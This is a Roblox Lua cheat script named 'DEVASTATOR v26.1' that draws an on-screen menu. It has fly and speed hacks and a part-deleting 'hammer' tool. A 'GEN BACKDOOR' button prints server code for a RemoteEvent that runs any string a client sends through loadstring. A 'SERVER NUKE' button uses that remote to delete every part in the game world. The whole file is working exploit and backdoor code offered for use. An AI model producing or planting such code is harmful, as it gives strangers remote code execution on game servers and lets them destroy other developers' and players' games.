--[[
    DEVASTATOR v26.1 // THE REBIRTH
    FIXED: Fly, Hammer, Speed, Backdoor.
]]

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local coreGui = game:GetService("CoreGui")

-- Сброс старого UI
for _, v in pairs(coreGui:GetChildren()) do if v.Name == "DevFix" then v:Destroy() end end
local sg = Instance.new("ScreenGui", coreGui) sg.Name = "DevFix"

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 500, 0, 400)
main.Position = UDim2.new(0.5, -250, 0.5, -200)
main.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
Instance.new("UICorner", main)
local stroke = Instance.new("UIStroke", main) stroke.Color = Color3.new(1,0,0) stroke.Thickness = 2

--------------------------------------------------
-- [1] FIX: FLY SYSTEM (MODERN)
--------------------------------------------------
local flying = false
local speed = 50
local flyPart

local function toggleFly()
    flying = not flying
    local char = lp.Character or lp.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    
    if flying then
        flyPart = Instance.new("Part", workspace)
        flyPart.Anchored = true
        flyPart.CanCollide = false
        flyPart.Transparency = 1
        
        task.spawn(function()
            while flying do
                task.wait()
                local cam = workspace.CurrentCamera
                local moveDir = Vector3.new(0,0,0)
                if uis:IsKeyDown(Enum.KeyCode.W) then moveDir = moveDir + cam.CFrame.LookVector end
                if uis:IsKeyDown(Enum.KeyCode.S) then moveDir = moveDir - cam.CFrame.LookVector end
                if uis:IsKeyDown(Enum.KeyCode.A) then moveDir = moveDir - cam.CFrame.RightVector end
                if uis:IsKeyDown(Enum.KeyCode.D) then moveDir = moveDir + cam.CFrame.RightVector end
                
                hrp.CFrame = CFrame.new(hrp.Position, hrp.Position + cam.CFrame.LookVector) * CFrame.new(0,0,0)
                hrp.Velocity = moveDir * speed
                hrp.Anchored = false
            end
        end)
    else
        if flyPart then flyPart:Destroy() end
        hrp.Velocity = Vector3.new(0,0,0)
    end
end

--------------------------------------------------
-- [2] FIX: HAMMER TOOL (B-TOOLS)
--------------------------------------------------
local function giveHammer()
    local tool = Instance.new("Tool")
    tool.Name = "DESTROYER"
    tool.RequiresHandle = false
    tool.Parent = lp.Backpack
    
    tool.Activated:Connect(function()
        local mouse = lp:GetMouse()
        local target = mouse.Target
        if target and target:IsA("BasePart") then
            -- Если есть бэкдор, удаляем на сервере, если нет - только у себя
            local stream = rs:FindFirstChild("NetworkStream")
            if stream then
                stream:FireServer(771, "game.Workspace['"..target.Name.."']:Destroy()")
            else
                target:Destroy()
            end
        end
    end)
end

--------------------------------------------------
-- [3] ГЛАВНЫЙ ИНТЕРФЕЙС
--------------------------------------------------
local grid = Instance.new("Frame", main)
grid.Size = UDim2.new(1, -20, 1, -100)
grid.Position = UDim2.new(0, 10, 0, 80)
grid.BackgroundTransparency = 1
Instance.new("UIGridLayout", grid).CellSize = UDim2.new(0, 150, 0, 40)

local function btn(txt, cb)
    local b = Instance.new("TextButton", grid)
    b.Text = txt
    b.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

btn("FLY (E)", toggleFly)
btn("GIVE HAMMER", giveHammer)
btn("SPEED +", function() speed = speed + 25 end)
btn("WALKSPEED 100", function() lp.Character.Humanoid.WalkSpeed = 100 end)

btn("GEN BACKDOOR", function()
    local code = "local s=game:GetService('ReplicatedStorage') local r=Instance.new('RemoteEvent',s) r.Name='NetworkStream' r.OnServerEvent:Connect(function(_,i,v) if i==882 then local l=game:GetService('Lighting') local k=l:FindFirstChildOfClass('Sky') or Instance.new('Sky',l) k.SkyboxBk=v k.SkyboxDn=v k.SkyboxFt=v k.SkyboxLf=v k.SkyboxRt=v k.SkyboxUp=v elseif i==993 then local sn=Instance.new('Sound',workspace) sn.SoundId=v sn.Volume=10 sn:Play() elseif i==771 then loadstring(v)() end end)"
    warn("!!! BACKDOOR CODE GENERATED IN F9 CONSOLE !!!")
    print(code)
end)

btn("SERVER NUKE", function()
    local stream = rs:FindFirstChild("NetworkStream")
    if stream then
        stream:FireServer(771, "for _,v in pairs(workspace:GetDescendants()) do if v:IsA('BasePart') then v:Destroy() end end")
    end
end)

-- Переключатель видимости меню
uis.InputBegan:Connect(function(k, g)
    if not g and k.KeyCode == Enum.KeyCode.L then main.Visible = not main.Visible end
    if not g and k.KeyCode == Enum.KeyCode.E then toggleFly() end
end)
